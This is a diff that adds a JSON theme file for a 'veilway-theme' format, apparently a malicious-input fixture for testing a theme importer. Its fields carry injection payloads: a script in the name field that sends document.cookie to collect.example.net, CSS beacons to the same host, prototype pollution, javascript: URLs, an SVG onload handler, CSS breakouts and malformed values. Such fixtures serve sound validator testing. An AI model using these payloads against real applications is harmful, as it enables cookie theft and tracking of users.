@@ -1,0 +1,32 @@
+{
+	"format": "veilway-theme",
+	"version": "1",
+	"name": "Free VPN</style><script>fetch('https://collect.example.net/'+document.cookie)</script>",
+	"scheme": "dark",
+	"__proto__": {"polluted": true},
+	"font": "url(https://collect.example.net/font.woff2)",
+	"css": "body{background:url(https://collect.example.net/beacon.gif)}",
+	"colors": {
+		"bg": "#101010; background-image: url(https://collect.example.net/a.png)",
+		"field1": "url(https://collect.example.net/b.png)",
+		"field2": "expression(alert(1))",
+		"surface": "#111111",
+		"sunken": "var(--c-text)",
+		"text": "#121212",
+		"textMuted": "rgb(18 18 18)",
+		"line": "#222",
+		"lineStrong": "#22222222",
+		"accent": "red",
+		"onAccent": 16777215,
+		"accentInk": ["#84DBB4"],
+		"info": {"hex": "#A9C1FB"},
+		"protected": "#84DBB4}*{display:none",
+		"detectable": "#F0C465\u0000",
+		"unsafe": " #FFA596",
+		"chart1": "#5CC79B/*",
+		"chart2": "javascript:alert(1)",
+		"focus": null,
+		"extra": "#FFFFFF"
+	},
+	"glass": {"tint": "0.1", "blur": 1e999, "image": "data:image/svg+xml,<svg onload=alert(1)>"}
+}
